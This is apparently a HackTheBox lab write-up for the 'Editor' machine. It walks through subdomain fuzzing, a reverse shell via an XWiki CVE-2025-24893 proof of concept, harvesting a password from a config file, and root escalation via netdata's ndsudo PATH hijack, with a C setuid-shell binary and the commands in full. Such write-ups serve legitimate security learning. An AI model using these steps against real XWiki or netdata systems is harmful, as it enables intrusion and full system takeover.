# Editor - HackTheBox Machine

Difficulty: Easy

---

## Enumeration

Run masscan and nmap to discover the following open ports 22,80,8080.

80 is running a website editor.htb so let's add it to hosts. Checking around on this website there was nothing of value so I went straight to vhost fuzzing.

Command:
```bash
ffuf -u "http://editor.htb" -H "Host: FUZZ.editor.htb" -w /usr/share/wordlists/dirb/common.txt -fl 8
```
This returns a subdomain called `wiki.editor.htb`. Add this to hosts.

After this it was time to check around for CVEs. The version this was running was `XWiki Debian 15.10.8`. So googling around for CVEs we found this: `https://github.com/Infinit3i/CVE-2025-24893`.

---

## Initial Access

Use this exploit after setting the appropriate parameters to gain a shell. Since my friend was having some problems with this exploit (we ewwere doing this together) I'll explain how to use this.

1. Start a netcat listener on port 31337
2. Now, in the PoC we have to change a few settings. Change the target host to `wiki.editor.htb`, and change the local host to your HTB vpn IP.
3. Now in a separate shell, navigate to the PoC directory and start a python server on port 8080.
4. Run the `Reverse Shell` option on the PoC now and if you did it right, you should see a shell on the computer. Repeat this a couple times tho, since it could fail.

Ok, now that that's done, it's time to get user. Read /etc/passwd to find that the home user is oliver.

Now we can try and hunt config files or mysql or whatever to get any data on oliver. I used `linpeas.sh` to no avail. So I just checked config files. There I found the password to oliver.

```bash
cat /usr/lib/xwiki/WEB-INF/hibernate.cfg.xml | grep password
```

This gives the password `theEd1t0rTeam99`. Use this to ssh in as oliver.

---

## Privilege Escalation

Now oliver cannot run `sudo -l`. So we need to look further.

On enumerating with `netstat -nltp`, I found port 19999 running a service. So using the command:
```bash
ssh -L 19999:127.0.0.1:19999 oliver@editor.htb
```

I forwarded the port to my local machine, which showed that it was running a service called netdata. Opening this site revealed a red alert on the top of the screen, which on clicking reveals the version to be `v1.45.2`.

There is a privilege escalation exploit for this detailed [here](https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93).

So here's what you do:
1. Create a binary like this:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
        setuid(0);
        setgid(0);
        system("/bin/sh");
        return 0;
}
```
2. Compile it using `gcc exploit.c -o exploit`.
3. Host this on your python server.
4. Then download it onto your target machine (use curl or wget).
5. As detailed in the link, first we will rename this file to nvme and then give it executable permissions. (I stored this file in /tmp/exploit)
6. Now do

```bash
export PATH=/tmp/exploit:$PATH
```

7. `/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list`

This should log you in as root.

--- 
